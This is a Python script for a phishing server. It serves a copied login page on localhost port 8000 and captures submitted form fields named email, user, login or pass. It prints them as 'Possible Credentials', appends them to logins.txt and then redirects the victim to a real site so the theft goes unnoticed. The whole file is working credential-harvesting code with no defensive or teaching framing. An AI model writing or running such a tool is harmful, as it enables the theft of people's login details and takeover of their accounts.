from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Style
from io import BytesIO
import re

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def run():
        #Here is where the server runs
        running = False
        httpd = HTTPServer(('localhost', 8000), SimpleHTTPRequestHandler)
        while not running:
            print('.::Listening on port 8000...\n')
            httpd.serve_forever()

    def do_GET(self):   #Request via GET
        self.send_response(200)
        self.end_headers()
        file = open('site/index.html','r')
        readfile = file.readlines()
        for lines in readfile:
            self.wfile.write(lines.encode())

    def do_POST(self):  #Request via POST
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(body)
        values = response.getvalue()
        self.getCredentials(values)

    def getCredentials(self, values):
        post = values.decode('UTF-8')
        readpost = post.strip('&')
        forms = ['email','user','login','pass'] #Possibles forms to get the credentials

        try:
            readpost = readpost.split('&')
            count = 0
            possibles = []
            file = open('logins.txt','a+')
            for line in readpost:
                for c in forms:
                    if c in line and re.search("^"+str(c),line) and len(line) > 0:
                        possibles.append(line)
                        count +=1
                        if count >= 2:
                            print('\n' + Fore.RED + "=" * 15 + " Possible Credentials " + "=" * 15)
                            print('[+].::',possibles)
                            print("=" * 52 + "\n")
                            print(Style.RESET_ALL)
                            file.write('    '.join(possibles)+'\n')
                            count = 0
                            possibles = []
                            try:
                                self.do_GET(self.redirect())
                            except BrokenPipeError:
                                pass
            file.close()

        except TypeError:
            pass

    def redirect(self):
        url = open('site/redirect.txt','r')
        url = url.readlines()
        redir = '<META http-equiv="refresh" content="1;URL='+url[0]+'"> '
        file = open('site/redirect.html','w')
        file.write(redir)
        file.close()
        file = open('site/redirect.html', 'r')
        readfile = file.readlines()
        for lines in readfile:
            self.wfile.write(lines.encode())

if not __name__ == '__main__':
    SimpleHTTPRequestHandler.run()
